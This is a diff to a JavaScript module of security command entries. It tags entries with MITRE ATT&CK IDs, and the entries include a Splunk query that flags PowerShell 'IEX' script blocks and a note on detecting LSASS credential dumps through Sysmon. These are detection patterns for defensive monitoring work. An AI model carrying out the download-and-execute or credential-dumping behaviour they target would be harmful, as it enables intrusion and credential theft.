           {
@@ -51163,6 +54953,9 @@ module.exports = [
             "tags": [
               "essential",
               "tool"
+            ],
+            "attack": [
+              "T1059.001"
             ]
           },
           {
@@ -51296,6 +55089,9 @@ module.exports = [
             "cmd": "python3 -c \"from pyattck import Attck; a=Attck(); print([t.id for t in a.enterprise.techniques][:10])\"",
             "tags": [
               "tool"
+            ],
+            "attack": [
+              "T1059.006"
             ]
           },
           {
@@ -51305,6 +55101,9 @@ module.exports = [
             "cmd": "echo 'T1059.001 PowerShell -> detection: Sysmon EID 1 / Script Block Logging EID 4104'",
             "tags": [
               "essential"
+            ],
+            "attack": [
+              "T1059.001"
             ]
           },
           {
@@ -51384,6 +55183,9 @@ module.exports = [
             "cmd": "echo 'index=windows EventCode=4104 ScriptBlockText=*IEX* earliest=-15m | table _time, Computer, ScriptBlockText'",
             "tags": [
               "essential"
+            ],
+            "attack": [
+              "T1059.001"
             ]
           },
           {
@@ -51393,6 +55195,9 @@ module.exports = [
             "cmd": "echo 'T1003.001 LSASS dump -> NO ALERT: create Sigma rule for Sysmon EID 10 target lsass.exe'",
             "tags": [
               "advanced"
+            ],
+            "attack": [
+              "T1003.001"
             ]
           }
         ]
